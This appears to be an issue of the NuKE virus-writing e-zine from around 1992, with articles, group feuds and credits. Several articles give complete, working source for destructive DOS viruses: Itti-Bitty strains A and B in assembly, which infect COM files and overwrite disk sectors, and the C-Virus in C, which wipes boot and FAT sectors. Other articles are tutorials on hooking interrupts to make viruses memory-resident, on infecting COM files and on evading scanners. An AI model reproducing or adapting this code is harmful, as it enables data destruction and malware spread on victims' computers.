+%^13^%
+About NuKE
+Mechanix
+
+    Before, I let you get on with this Infojournal, I would like to clear some
+things up about NuKE. Firstly, and most importantly, NuKE has not crashed a
+board since it's creation, and we do not plan to. We may make programs that
+have this use, but we have never used them ourselves for personal uses. As I
+stated on many occasions, we are not responsible for what people might do with
+our releases. It's not cause you build a gun that you are responsible for
+every shooting that takes place. This is especially directed to all those
+implicated in the Optic Fiber incident, who by the way is not in NuKE anymore
+for legal reasons. Next, NuKE does not go around infecting people and software
+with virii. We make them, sure, but we don't go around nailing everyone just
+for the sheer pleasure of it. Next, all programs and material produced by NuKE
+are original and are not just cheap hacks of others. Take this Infojournal for
+example. I dare anybody to show me something that looks like it. It comes from
+my own design and ideas, and I take full responsibility and credit for any
+bugs or others found in this program, if used properly and unmodified. I
+stress the unmodified, as some lamer is bound to modify the articles. I could
+have put a better crypting routine, but it would be a waste, and if anyone
+wants the original, download it off my board or any other NuKE site. Lastly,
+we are not in competition with anyone, and exist only to suit our purposes. We
+may have had arguments with groups like RABID and HiF, but we couldn't care
+less what happens to these groups. Now, I will let you get on with this
+release.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^61^%
+Infojournal Credits
+Staff
+
+    This release was dedicated to Prince Of Thieves. Not many people to thank
+for this one, except for all the writers, NuKE members and all supporting
+sysops, as well as all SCP/NuKE members. Heres the list:
+
+- Mechanix - Programmer/Editor/Writer/NuKE Member
+- Rock Steady - Writer/NuKE Member
+- Acid Face - Writer/NuKE Member
+- Nowhere Man - Writer/NuKE Member
+- The Darkman - Writer/NuKE Member
+- Prince Of Thieves - Writer/NuKE Member
+- The Illusionist - Guest Writer
+- Dark Angel - NuKE Member
+- Igmaster - NuKE Member
+- Jack Damn - NuKE Member
+- Nemesis - NuKE Member
+- Phrozen Virus - NuKE Member
+- Hades - Sysop
+- Kato - Sysop
+- Djinii - Sysop
+- Night Shade - Sysop
+- Phrozen Doberman - SCP/NuKE Member
+- Lord Venom - Writer/SCP/NuKE Member
+- Rigor Mortis - Writer/SCP/NuKE Member
+- Comhack International - SCP/NuKE Member
+- The Assassin - SCP/NuKE Member
+- Kick Boxer - SCP/NuKE Member
+
+%End of File%
+%^35^%
+Contruction Kit for TSR Virii
+Rock Steady
+
+    There are several ways to constructed your viruses. Mainly you have those
+which are RAM-Resident or better known as a TSR program. And with great
+thought we have those which are not RAM-Resident.
+
+    A TSR virus will load into memory and can infect all programs that are
+executed by the computer. Such like my AmiLiA virus which will infect all
+EXE and COM files that are ran. Anyhow a TSR virus can certainly spread a lot
+faster compared to a Non-Resident Virus. Because a NON-Resident Virus will
+only infect file each time it is ran. Though the NON-Resident will start
+off very slowly infecting the system files but after the virus is in the
+system after a number of weeks, it will certainly infect ALL files that are
+in the system. Where a TSR virus will USUALLY infect files that are executed.
+So that only files that are often executed will be infected. But The TSR
+virus can certainly infect A LOT more files than a Non-Resident JUST on the
+first Hour! It is out numbered 10 to 1. This is the advantage that all
+programmers enjoy and program TSR viruses. I will explain a SIMPLE method of
+making your program a TSR one. And it will be as flexible as you want so
+that NO ONE can stay you `Stole' this information off Rock Steady.
+
+    Anyhow I will explain the simple Process of Intercepting ROM-Bios
+Interrupts and hooking your virus/Program to any Interrupt of your choice.
+This method that is being explained is also used ALL the Jerusalem Strains.
+And several of the Vacsina Strains. They total up to close to 100+ Viruses
+that use this simple way with the TSR Interrupt 27h. Anyhow just because I'm
+explaining this method your virus CANNOT be detected because of this TSR
+routines because there are routines I DEVELOPED ALONE and will soon to be
+release in one of my future virii. Anyhow there are an UNLIMITED amount of
+ways to make TSRs so that along as you Develop YOUR OWN routine it will NEVER
+get detected as a virus for all you Beginners. And how this routine can be
+used in several OTHER utilities not just viruses.
+
+                            Beginning...
+                            ~~~~~~~~~~~
+    First we must Intercept an Interrupt, Lets say we want our virus to
+activate Every TIME the disk I/O is being used we would use INT 13h or
+INT 21h. The INT 13h will activate everytime ANY file is opened or Closed
+And the INT 21h will activity anytime any file is executed or any INT 21h
+functions Like a "DIR" in DOS. If you want you can even hooked your virus
+to INT 10h and it may activate when Graphics are displayed, or you can hook
+it to the interrupt involved with Printer Functions. Whatever seems to
+`EnLighten' you, since we live in a Distressed world, I won't even bother
+why we shouldn't hooked them up to just ANY interrupt.
+
+    Anyhow, interrupts use a vector table at the bottom of memory (ROM) to
+find out what routine in the ROM Bios to call. So the address for Interrupt
+21h would be located at 0000:0084 and for Interrupt 13h it would be found at
+0000:004Ch. So we can change theses addresses in the vector table. What we
+do is we change the vector address to POINT to our virus. So everytime the
+Interrupt is called it goes to the vector table and the table tells it to
+call our Virus, rather than calling the ROM Bios. But what MUST do
+FIRST is save the ORIGINAL Interrupt routine and place that somewhere in
+memory. So that our virus will call the Original ROM Bios routine after
+executing itself.
+
+    Lets say we hooked our Virus to the INT 13h, which controls all Disk
+Activities. So if our Computer users tries to read something from the disk
+the Computer will call the INT 13h bios Routines on How To do it. But
+instead of finding the INT 13h routines it calls our virus, and the Virus
+gets ran, which then our virus does what it has to do, and then runs the
+Original INT 13h Routine where-ever it was stored. So it simulates an INT
+call to the ROM bios routines.
+
+;----------------------------------------------------------------
+; Sample Program on how to Hook your virus to an Interrupt call.
+;----------------------------------------------------------------
+Code        Segment
+        Assume  cs:code,ss:code,ds:code,es:code
+        Org     100h       ; Guess this will be a COM file? Huh?
+
+
+Begin:  JMP     Bios_Routine
+
+        NOP                  ; This is just a cheap .COM file that the
+        NOP                  ; virus is attached to. Remember you should
+        NOP                  ; have the first 3 bytes written in your
+        INT     20h          ; virus.
+
+OLD_ROM_INT     DD      ?    ;Our Stack to save the OLD Int Address
+
+;----------------------------------------------------------------
+; This Calls the VIRUS and then the simulates the OLD Rom Routine
+;----------------------------------------------------------------
+Virus_Codes    PROC     FAR
+       Assume  cs:code, ds:nothing
+
+       pushf               ; Everytime the ROM-Routine is call this
+       push    ax          ; is what happens... Saves the Regesters
+       push    di          ; And runs Our Virus... Then it restores
+       push    si          ; the regesters and Runs the OLD_ROM Bios
+       push    es          ; Routine that was supposed to be ran in
+       push    ds          ; the first place...
+       call    The_Virus
+       pop     ds          ;NoTe: It's better to SAVE all Regesters and
+       pop     es          ; Flags because our Virus WILL ALTER a few
+       pop     si          ; And when the Virus leaves control back to the
+       pop     di          ; Computer it is EXPECTED to continue where it
+       pop     ax          ; It left off...
+       popf
+
+       pushf            ; This `pushf' is NEEDED to act like a simulated
+       call    OLD_ROM_INT       ; ROM Bios Interrupt call...
+
+       ret
+Virus_Codes   ENDP
+
+;----------------------------------------------------------------
+; Put the REAL Virus Codes here...
+;----------------------------------------------------------------
+The_Virus        PROC    NEAR
+       ...            ; Put your OWN Virus codes here...
+       ...            ; Just make it compatible with our
+       ...            ; Codes... Try to make it small and
+       ...            ; it will take up less space in the
+       ...            ; users' memory.
+       ...
+       ...            ;NoTe: Try to infect files that are ONLY
+       ...            ; Executed! Rather than each time the INT
+       ...            ; is used... Get it?
+       RET
+The_Virus      ENDP
+
+;---------------------------------------------------------------
+; This is the Procedure that SAVE the OLD_ROM Bios in our Virus
+; And places a Call to point to our Virus. Which then Calls the
+; OLD_ROM Bios Routine. So Remember to SAVE it first.
+;---------------------------------------------------------------
+Bios_Routine   PROC    NEAR
+       Assume  cs:code,ds:code
+
+       mov     ah,35h      ; This Asks for the interrupt vector!
+       mov     al,13h      ; whatever is in AL is what int vector
+       int     21h         ; address you get and is stored in ES:BX
+
+       mov     word ptr OLD_ROM_INT,bx   ;Save the BX register in our Stack
+       mov     word ptr OLD_ROM_INT[2],es ;And same to the ES Register
+
+; Here you SHOULD put a small routine to check if the Interrupt vector has
+; already been changed! For INT 13h this should contain 0000:004Ch the
+; formula for this is (Interrupt # times 4) For INT 21h it is (21h x 4)=84h
+; and so on. So if its been changed it means the virus has already changed
+; it! And it `Should' be resident. How ever this is a simple way of doing
+; it. but not always the BEST way... Because any program the hooks to the
+; virus interrupt will fool the virus to think it is already resident.
+; Though this source is NOT for the Professional Virus Programmer like myself
+; because WE KNOW! But for those that are half way there...
+
+       mov     ah,25h    ; This asks to set a Interrupt vector address!
+       mov     al,13h    ; Interrupt # to be set goes in AL
+       mov     dx,offset Virus_Codes ; Sets INT 13h to point to `Virus Code'
+       int     21h
+
+       mov     dx,offset Bios_Routine
+       int     27h
+Bios_Routine     ENDP
+
+;  Anything after this point will not be memory resident. because the end
+;  of the resident portion ends at `Bios_Routine' procedure.
+
+Code        ENDS
+     END    Begin
+;----------------------------- EnD ----------------------------------
+
+Simple isn't it? Anyhow I tried to make this as simple as possible. I
+hope I didn't lose you. Anyhow this is a simple routine that several
+TSR virii use. Anyhow, see what that gives you....
+
+                          Rock Steady
+              NukE / Viral Development Researcher
+                            -PeAcE-
+
+%End of File%
+%^23^%
+The Itti-Bitty Virus
+Nowhere Man
+
+I. Introduction
+
+    The Itti-Bitty virus started as a challenge to myself to see how small I
+could make a fully-functional virus.  The one to beat was Tiny, an appending
+virus with a size of 163 bytes.  Tiny didn't change directories, didn't affect
+read-only files, didn't reset file date and times of infected files, didn't
+do anything destructive, and was easily flagged down by Virex-PC or Flu-Shot+,
+as well as the fact that McAfee SCANned it.  First, I settled on an
+overwriting virus.  Either way the checksum of a file is going to change, and
+overwriting aren't as noticeable from the DIR point-of-view, and overwriting
+would require fewer bytes of code to do the job.  Then I coded the thing and
+started optimizing.  The result was the 161-byte Itti-Bitty virus, strain A.
+Then I ripped out extraneous code, the "bells and whistles," if you will, and
+ended up with the 99-byte Itti-Bitty strain B.  Both virii are non-encrypting,
+and both have the same effect:  they overwrite the first 256 sectors of C:
+with random garbage, making the disk unrecoverable by normal means.  Since I
+figured it would only be a few weeks before someone disassembled my virii, I
+decided to distribute the original source, so that others can learn from my
+code.
+
+
+II.  Strain A
+
+    Strain A of the Itti-Bitty virus is 161 bytes in length.  It detects the
+presence of Virex-PC and Flu-Shot+ by calling interrupt 21h with AX set to
+FF0Fh.  If either of these TSR virus-protectors are loaded, then Itti-Bitty
+aborts, stopping premature detection and allowing the victim to (doubtfully)
+spread the infected file.  Then it tries to infect any uninfected .COM file in
+the current directory by overwriting the start of it with itself.  Read-only,
+etc. files ARE affected, and their attributes are reset after the infection
+is complete.  File date and time are also preserved for better stealth.
+Finally, a bogus error message, "EXEC failure," is displayed and control is
+returned to DOS.  ("EXEC failure" was the shortest fatal error message I could
+find in COMMAND.COM.  I've never seen anyone get it, but it is legit, and
+it's obscure enough to scare novice users.)  If all files are infected, then
+as I stated above, their C: disk is trashed and the computer is locked up.  No
+message, no fanfare, no nothing; their just plain fucked.  That's it. Only
+161 bytes, too.
+
+
+III.  Strain B
+
+    Strain B of Itti-Bitty is simply Strain A with the Virex check, the
+attribute alteration, and the date/time preservation removed.  It still
+trashes C:, but is far more noticeable, since, like I said, file date and time
+aren't preserved.  Also, no error message is displayed.  (You'd be surprised
+how many losers will keep running the thing over and over because nothing
+seems to happen.)  All under one-hundred bytes.  That's damn small.
+
+
+IV.  Miscellaneous comments from Nowhere Man
+
+    I'd like to use this space to say a few things to everyone.  First, I'd
+like to announce that I'm now affiliated with [NuKE] and [NuKE] WaReZ, a fine
+Canadian hacking/phreaking/carding group.  Look for other fine [NuKE] warez,
+such as the infamous Parasite virus and the Telegard Bypass trojan, at a
+respectable h/p board near you.
+    Secondly, I'd like to say Hi to Software Spartan, Murdak and Leeking
+Virus at the Pirate's Guild, and The DarkMan and all the other great guys at
+[NuKE].
+    I also want to challenge all of the other virus-writing groups (F‹S,
+RABID, etc.) out there to come up with a smaller virus with the same features
+(or better ones); I think we can use some friendly competition, and besides,
+competitiveness leads to better virii for all.
+    If anyone can find a way to make Itti-Bitty Strain A or B smaller while
+still keeping in all of the features, or if you have a question, comment, or
+complaint about Itti-Bitty, C-Virus, or any other fine product from Nowhere
+Man, I can be reached at either the Pirate's Guild, or Hell Pit.
+
+                    Nowhere Man, [NuKE] '92
+
+%End of File%
+%^32^%
+Itti-Bitty Strain B Source
+Nowhere Man
+
+; The Itti-Bitty Virus, Strain B
+; The smallest virus ever written (only 99 bytes)
+;
+; (C) 1991 Nowhere Man and [NuKE] WaErZ
+; Written by Nowhere Man
+;
+;
+
+        title   "The Itti-Bitty Virus, Strain B:  Even smaller"
+
+        code    segment 'CODE'
+                assume cs:code,ds:code,es:code,ss:code
+
+                org     0100h
+
+code_length     equ     finish - start
+
+start           label   near
+               
+id_bytes        proc    near
+                mov     si,si                   ; Serves no purpose:  our ID
+id_bytes        endp
+
+main            proc    near
+                mov     ah,04Eh                 ; DOS find first file function
+                mov     cx,00100111b            ; CX holds attribute mask
+                mov     dx,offset com_spec      ; DX points to "*.COM"
+
+file_loop:      int     021h
+                jc      go_off                  ; If there are no files, go
+                                                ; off
+
+                call    infect_file             ; Try to infect found file
+                jne     exit_virus              ; Exit if successful
+
+                mov     ah,04Fh                 ; DOS find next file function
+                jmp     short file_loop         ; Repeat until out of files
+
+exit_virus:     mov     ax,04C01h               ; DOS terminate function,
+                                                ; code 1
+                int     021h
+main            endp
+
+go_off          proc    near
+                cli                             ; Prevent all interrupts
+
+                mov     ah,2                    ; AH holds drive number (C:)
+                cwd                             ; Start with sector 0 (boot)
+                mov     cx,0100h                ; Write 256 sectors
+                int     026h                    ; DOS absolute write interrupt
+
+                jmp     $                       ; Infinite loop; lock up
+                                                ; computer
+go_off          endp
+
+infect_file     proc    near
+                mov     ax,03D02h               ; DOS open file function,
+                                                ; read-write
+                mov     dx,09Eh                 ; DX points to the victim
+                int     021h
+
+                xchg    bx,ax                   ; BX holds file handle
+
+                mov     ah,03Fh                 ; DOS read from file function
+                mov     cx,2                    ; CX holds byte to read (2)
+                mov     dx,offset buffer        ; DX points to buffer
+                int     021h
+
+                cmp     word ptr [buffer],0F68Bh;Are the two bytes "MOV SI,SI"
+                pushf                           ; Save flags
+                je      close_it_up             ; If not, then file is OK
+
+                cwd                             ; Zero CX \_ Zero bytes from
+                                                ; start
+                mov     cx,dx                   ; Zero DX /
+                mov     ax,04200h               ; DOS file seek function,
+                                                ; start
+                int     021h
+
+                mov     ah,040h                 ; DOS write to file function
+                mov     cx,code_length          ; CX holds virus length
+                mov     dx,offset start         ; DX points to start of virus
+                int     021h
+
+close_it_up:    mov     ah,03Eh                 ; DOS close file function
+                int     021h
+
+                popf                            ; Restore flags
+                ret                             ; Return to caller
+
+buffer          dw      ?                       ; Buffer to hold test data
+infect_file     endp
+
+
+; Initialized data goes here
+
+com_spec        db      "*.COM",0               ; What to infect:  all COM
+                                                ; files
+
+finish          label   near
+
+code            ends
+                end     id_bytes
+
+%End of File%
+%^33^%
+Sources for the C-Virus
+Nowhere Man
+
+/* C-Virus:  A generic .COM and .EXE infector
+   Written by Nowhere Man
+   October 2, 1991
+   Version 2.1
+*/
+
+#include <dir.h>
+#include <dos.h>
+#include <fcntl.h>
+#include <io.h>
+#include <stdio.h>
+
+
+/* Note that the #define TOO_SMALL is the minimum size of the .EXE or .COM
+   file which CVIRUS can infect without increasing the size of the file.
+   (Since this would tip off the victim to CVIRUS's presence, no file under
+   this size will be infected.)  It should be set to the approximate size
+   of the LZEXEd .EXE file produced from this code, but always a few bytes
+   larger.  Why?  Because this way CVIRUS doesn't need to check itself for
+   previous infection, saving time.
+
+   SIGNATURE is the four-byte signature that CVIRUS checks for to prevent
+   re-infection of itself.
+*/
+
+#ifdef DEBUG
+#define TOO_SMALL 6000
+#else
+#define TOO_SMALL 4735
+#endif
+
+#define SIGNATURE "NMAN"
+
+
+/* The following is a table of random byte values.  Be sure to constantly
+   change this to prevent detection by virus scanners, but keep it short
+   (or non-exsistant) to keep the code size down.
+*/
+
+char screw_virex[] = "\xF5\x23\x72\x96\x54\xFA\xE3\xBC\xCD\x04";
+
+void hostile_activity(void)
+{
+          /* Put whatever you feel like doing here...
+             I chose to make this routine trash the victim's boot, FAT, and
+             directory sectors, but you can alter this code however you want,
+             and are encouraged to do so.
+          */
+
+
+#ifdef DEBUG
+          puts("\aAll files infected!");
+          exit(1);
+#else
+          /* Overwrite five sectors, starting with sector 0, on C:, with the
+             memory at location DS:0000 (random garbage).
+          */
+
+          abswrite(2, 5, 0, (void *) 0);
+          __emit__(0xCD, 0x19);   // Reboot computer
+#endif
+}
+
+int infected(char *fname)
+{
+          /* This function determines if fname is infected.  It reads four
+             bytes 28 bytes in from the start and checks them agains the
+             current header.  1 is returned if the file is already infected,
+             0 if it isn't.
+          */
+
+          register int handle;
+          char virus_signature[35];
+          static char check[] = SIGNATURE;
+
+          handle = _open(fname, O_RDONLY);
+          _read(handle, virus_signature, sizeof(virus_signature));
+          close(handle);
+
+#ifdef DEBUG
+          printf("Signature for %s:  %.4s\n", fname, &virus_signature[28]);
+#endif
+
+          /* This next bit may look really stupid, but it actually saves about
+             100 bytes.
+          */
+
+ return((virus_signature[28] == check[0]) && (virus_signature[29] == check[1])
+ && (virus_signature[30] == check[2]) && (virus_signature[31] == check[3]));
+}
+
+void spread(char *virus, struct ffblk *victim)
+{
+          /* This function infects victim with virus.  First, the victim's
+             attributes are set to 0.  Then the virus is copied into
+             the victim's file name.  Its attributes, file date/time, and
+             size are set to that of the victim's, preventing detection, and
+             the files are closed.
+          */
+
+          register int virus_handle, victim_handle;
+          unsigned virus_size;
+          char virus_code[TOO_SMALL + 1], *victim_name;
+
+
+        /* This is used enought to warrant saving it in a separate variable */
+
+          victim_name = victim->ff_name;
+
+
+#ifdef DEBUG
+          printf("Infecting %s with %s...\n", victim_name, virus);
+#endif
+
+          /* Turn off all of the victim's attributes so it can be replaced */
+
+          _chmod(victim_name, 1, 0);
+
+
+#ifdef DEBUG
+          puts("Ok so far...");
+#endif
+
+          /* Recreate the victim */
+
+          virus_handle = _open(virus, O_RDONLY);
+          victim_handle = _creat(victim_name, victim->ff_attrib);
+
+
+          /* Copy virus */
+
+          virus_size = _read(virus_handle, virus_code, sizeof(virus_code));
+          _write(victim_handle, virus_code, virus_size);
+
+
+#ifdef DEBUG
+          puts("Almost done...");
+#endif
+
+          /* Reset victim's file date, time, and size */
+
+          chsize(victim_handle, victim->ff_fsize);
+          setftime(victim_handle, (struct ftime *) &victim->ff_ftime);
+
+
+          /* Close files */
+
+          close(virus_handle);
+          close(victim_handle);
+
+#ifdef DEBUG
+          puts("Infection complete!");
+#endif
+}
+
+struct ffblk *victim(void)
+{
+         /* This function returns a pointer to the name of the virus's next
+            victim.  This routine is set up to try to infect .EXE and .COM
+            files.  If there is a command line argument, it will try to infect
+            that file instead.  If all files are infected, hostile activity
+            is initiated...
+         */
+
+          register int done;
+          register char **ext;
+          static char *types[] = {"*.EXE", "*.COM", NULL};
+          static struct ffblk ffblk;
+
+          for (ext = (*++_argv) ? _argv : types; *ext; ext++) {
+  done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH);
+                  while (!done) {
+
+#ifdef DEBUG
+                          printf("Scanning %s...\n", ffblk.ff_name);
+#endif
+
+          /* If you want to check for specific days of the week, months, etc.,
+             here is the place to insert the code (don't forget to "#include
+             <time.h>").
+          */
+
+              if ((ffblk.ff_fsize > TOO_SMALL) && (!infected(ffblk.ff_name)))
+                                  return(&ffblk);
+                          done = findnext(&ffblk);
+                  }
+          }
+
+
+          /* If there are no files left to infect, have a little fun */
+
+          hostile_activity();
+}
+
+int main(void)
+{
+         /* In the main program, a victim is found and infected.  If all files
+            are infected, a malicious action is performed.  Otherwise, a bogus
+            error message is displayed, and the virus terminates with code
+            1, simulating an error.
+         */
+
+          static char *err_msg[] = {"Out of memory", "Bad EXE format",
+                                    "Invalid DOS version", "Bad memory block",
+                                    "FCB creation error", "Sharing violation",
+                                    "Abnormal program termination",
+                                    "Divide error"
+                                   };
+          register char *virus_name = *_argv;
+
+          spread(virus_name, victim());
+          puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);
+          return(1);
+} 
+
+%End of File%
+%^51^%
+To hack or not to hack
+The Darkman
+
+    "I'm a hacker!!!" is the most common phrase in the computer
+underground these days... What is a " Hacker " ??? Well, about 5 years
+ago, if you called yourself a computer hacker, you had a reason to be
+proud... A computer hacker used to mean a guy that could get around
+where he wanted on any computer system, do anything with his own
+system. Basically, a CPU Wiz... Now, hacker has turned into a truly
+ugly word, used mainly by lamers and wanna-be's...
+
+    First of all, a guy calls himself a hacker if he has crashed a
+BBS... Come on people!!! If being a hacker meant crashing boards, anyone
+could be a hacker... Which is not the case... I must name the defunct
+group HiF for being the guiltiest of those so called " Hackers ".
+Luckily, those kind of Hacking groups have died off... None are left.
+Unless you can count FiS for being still in, because Dallas Barr kinda
+thinks he still stands a chance. HiT, HiF, etc... All gone.
+
+    Second activity that has been labeled Hacking, is the editing of
+certain programs... Like for example Illuminatus... It takes a real
+brainy Hacker to modify a source code for a magazine, doesn't it???
+Again, people call this hacking... Or more in our case, taking a virus
+code, and making it unscannable... Or BBS progs... More precisely, the
+Forum "Hacks". I personally am against people modifying Magazine
+sources... Like the people that did Illuminatus worked hard at their
+feat, only to see it treated like shit by people to lazy to do they're
+own.. Even a group of programmers, like RABID had to use someone
+else's source... Pathetic...
+
+    The most common activity associated with Hacking, is being able
+to infiltrate networked systems, or computer environments such as
+TymNet, DataPac, VAX/VMS, UNIX or PRIMOS... That is more like it.. The
+hacking I know has to do with much more though... There is infiltrating
+Bell systems, Electrical companies, basically all Utility companies, and
+best of all, banks!!! And much to my dismay, most of the best hackers
+are now defunct... MCI Sprinter, we will miss you... Snifffff.
+
+    I hope this will now stop the uprising of a multitude of new
+" Hackers " in the future, and also maybe re-instating the status of
+being a Hacker, so we can be proud once more of being one...
+
+The DarkMan, [NuKE]'92
+
+%End of File%
+%^21^%
+Parasite Virus IIB
+Rock Steady
+
+                     -  ParaSite Virus IIB  -
+                 -  Programed by: Rock Steady  -
+                   -  Completed December 8th  -
+
+         Length 909 Bytes            Undetectable from SCANV85
+
+  NOTES: Anyhow I seem to have improved one of the first virii I've
+     ever programed. Anyhow lots of changes have gone into this virus
+     compared to the original Parasite.
+
+  FEATURES: The functions of the this virus is mainly the same as the
+     original virus. Which is that when ran it contains a random
+     generator that will infect all .COMs 70% of the time. And it will
+     play machine gun noises on your PC Speaker then reboot. and 10%
+     of the time it will reboot your system. And if the virus is ran
+     on Mondays, it will overwrite the BOOT and FAT areas of your HD.
+
+  IMPROVEMENTS: I scrambled several lines that would of made it a
+     clone of the first Parasite. Meaning, if SCAN detect Parasite
+     it will not detect Parasite II. Because of the bytes that
+     were scrambled all over the virus. And I improved a fast and
+     better way of infection. The virus will now always try to infect
+     COMMAND.COM. Anytime it is activated it will infect a .COM and
+     then check to see if COMMAND.COM is infected. If not it will
+     be infected. So even after being cleaned out, if the user forgot
+     just one file it will infect COMMAND.COM and boom, the whole
+     procedure starts again. Even if files are hidden or read only
+     they will be infected. And dates are not changed. And no
+     memory is taken up. The file will just increase by a mere 909
+     Bytes. Anyhow enjoy!
+
+
+                           Rock Steady
+                [NukE]/Viral Development Researcher
+                             -PeAcE-
+
+%End of File%
+%^53^%
+The RABID Affair
+The Darkman
+
+    Everyone knows by now about the run-in between [NuKE] and RABID...
+But unfortunately, not many people know the true story... And believe
+it or not, I only found out some of the truth during the Christmas
+holidays... This is how it goes...
+
+    When [NuKE] first started, we had the outmost respect for the
+group called RABID, a group we considered at the time to be our
+idols... One of our star programmers, Rock Steady, wanted to show
+RABID what we were capable of, in the hoping of attracting some
+attention. Rocky, being a Hype kinda guy, uses a language that is
+often mis-interpreted when read. Part of the text string within the
+virus code of the Parasite virus, was the phrase; RABiT, RABiT,
+RABiT... Eat This! Which was, for the first part, an inside joke between
+a few of our friends, and for the second part, an invitation to check
+it out...
+
+    Well then, along came a guy named Time Lord. Time Lord, being
+a lonely guy, begged the Rabid guys to be a member, so finally they
+accepted... So this guy Time Lord, hounded me until I almost took a
+fit, following me to every board I went, capturing my messages, etc.
+Until he finally came across the Parasite Virus. Ahhh!!! now there was
+an opportunity to fuck up those NuKE guys for good!!! And so he told
+them about the text string.
+
+    Next thing I know, I receive this letter from a Rabid member, by
+the name of Data Disruptor, whom I believed as everyone else to be
+of the age of 30+ years old, so they said. The letter, titled: NuKE...
+Prepubescent Egostical Geeks, basically told me off, and demanded a
+written apology. And me, not wanting a war with a group I personaly
+admired, called up Rock Steady, and we wrote an apology. And it was
+posted on the Members Only base of RabNet... Well, I receive another
+letter saying it was to late to apologize, and virus warfare was going
+to break out in 514... ( Yeah, Sure... )
+
+    Anyways, they then released a newsletter of they're own, called
+CENSOR... And again, all they could do was diss us... They basically
+made a fool of themselves, just before they're break-up... Why they
+broke up? Nobody knows... But it's a relief to all... Having an immature
+group like RABID making and spreading virii, is a scary thought...
+
+    And now for the funny part called, THE TRUTH... Data Disruptor,
+the 30 year old assembler star from Bulgaria, is actually a 17 year
+old punk from Toronto... Yes folks, you've heard it... A punk... Colored
+hair, and all... So Mr Disruptor has been programming ASM like a star
+since he's 12 years old... (NOT!) So finally, we have the truth about
+the RABID AFFAIR... And also about Data Disruptor.
+
+
+The DarkMan, [NuKE]'92
+
+%End of File%
+%^31^%
+Itti-Bitty Strain A Source
+Nowhere Man
+
+; Itti-Bitty Virus, Strain A
+; The world's smallest virus (except for Strain B, but still only 161 bytes)
+;
+; (C) 1991 Nowhere Man and [NuKE] WaErZ
+; Written by Nowhere Man
+
+        title   "The Itti-Bitty Virus, Strain A:  The smallest virus ever"
+
+        code    segment 'CODE'
+                assume cs:code,ds:code,es:code,ss:code
+
+                org     0100h
+
+code_length     equ     finish - start
+
+start           label   near
+               
+id_bytes        proc    near
+                mov     si,si                   ; Serves no purpose:  our ID
+id_bytes        endp
+
+main            proc    near
+                mov     ax,0FF0Fh               ; Virex installation check
+                int     021h                    ; function
+                cmp     ax,0101h                ; Is Virex loaded?
+                je      exit_virus              ; If so, then bail out now
+
+                mov     ah,04Eh                 ; DOS find first file function
+                mov     cx,00100111b            ; CX holds attribute mask
+                mov     dx,offset com_spec      ; DX points to "*.COM"
+
+file_loop:      int     021h
+                jc      go_off                  ; If there are no files, go
+                                                ; off
+                call    infect_file             ; Try to infect found file
+                jne     exit_virus              ; Exit if successful
+
+                mov     ah,04Fh                 ; DOS find next file function
+                jmp     short file_loop         ; Repeat until out of files
+
+exit_virus:     mov     ah,9                    ; DOS display string function
+                mov     dx,offset fake_error    ; DX points to fake error
+                int     021h                    ; message
+
+                mov     ax,04C01h               ; DOS terminate function,
+                int     021h                    ; code 1
+main            endp
+
+go_off          proc    near
+                cli                             ; Prevent all interrupts
+
+                mov     ah,2                    ; AH holds drive number (C:)
+                cwd                             ; Start with sector 0 (boot)
+                mov     cx,0100h                ; Write 256 sectors
+                int     026h                    ; DOS absolute write interrupt
+
+                jmp     $                       ; Infinite loop; lock up
+go_off          endp                            ; computer
+
+infect_file     proc    near
+                mov     ax,04301h               ; DOS set file attributes
+                                                ; function
+                xor     cx,cx                   ; Clear all attributes
+                mov     dx,09Eh                 ; DX points to victim's name
+                int     021h
+
+                mov     ax,03D02h               ; DOS open file function,
+                                                ; read-write
+                int     021h
+
+                xchg    bx,ax                   ; BX holds file handle
+
+                mov     ah,03Fh                 ; DOS read from file function
+                mov     cx,2                    ; CX holds byte to read (2)
+                mov     dx,offset buffer        ; DX points to buffer
+                int     021h
+
+                cmp     word ptr [buffer],0F68Bh;Are the two bytes "MOV SI,SI"
+                pushf                           ; Save flags
+                je      close_it_up             ; If not, then file is OK
+
+                cwd                             ; Zero CX \_ Zero bytes from
+                                                ; start
+                mov     cx,dx                   ; Zero DX /
+                mov     ax,04200h               ; DOS file seek function,
+                                                ; start
+                int     021h
+
+                mov     ah,040h                 ; DOS write to file function
+                mov     cx,code_length          ; CX holds virus length
+                mov     dx,offset start         ; DX points to start of virus
+                int     021h
+
+close_it_up:    mov     si,095h
+                lodsb
+                push    ax                      ; Save file's attributes for
+                                                ; later
+                lodsw
+                xchg    cx,ax                   ; CX holds [096h]
+                lodsw
+                xchg    dx,ax                   ; DX holds [098h]
+                mov     ax,05701h               ; DOS set file time function
+                int     021h
+
+                mov     ah,03Eh                 ; DOS close file function
+                int     021h
+
+                mov     ax,04301h               ; DOS set file attributes
+                                                ; function
+                pop     cx                      ; CX holds file's old
+                                                ; attributes
+                mov     dx,09Eh                 ; DX points to victim's name
+                int     021h
+
+                popf                            ; Restore flags
+                ret                             ; Return to caller
+
+buffer          dw      ?                       ; Buffer to hold test data
+infect_file     endp
+
+
+; Initialized data goes here
+
+com_spec        db      "*.COM",0               ; What to infect: all COM
+                                                ; files
+
+fake_error      db      "EXEC failure",13,10,"$"; Fake error message
+
+finish          label   near
+
+code            ends
+                end     id_bytes
+
+%End of File%
+%^36^%
+Construction Kit on infecting .COM
+Rock Steady
+
+    Well I must state my opinion that there are certainly WAY too many
+Overwriting Viruses out here. To help put a Stop to this I will try
+to explain to you a SIMPLE way to infect COM files at the END of the
+Program. This routine WORKS if you follow my steps correctly, and
+I've already used this in my `ParaSite ][' Virus.
+
+Anyhow this is a brief description what the ASM Source will do.
+            1. Find a .COM file in the current Directory
+            2. Save the Date and File's Attribute.
+            3. Save the First 3 Bytes in a Stack
+            4. Infect the File & restore new 3 bytes..
+            5. Put the OLD date and File Attributes back on
+
+                         Beginning...
+                        ~~~~~~~~~~~~
+;----------------------------------------------------------------------
+; The Simple routine to Search for a .COM File...
+;----------------------------------------------------------------------
+com_files       db      "*.com",0
+
+        mov     ah,4eh          ;point to a *.COM file...
+        mov     dx,com_files
+        mov     cx,3            ;Attributes with ReadOnly or Hidden
+        int     21h             ;is A okay...
+
+        cmp     ax,12h          ;Any files found?
+        je      exit            ;If no Files found Exit...
+        jmp     found_file
+; Instead of Exiting here you can make the Virus go and change dir and
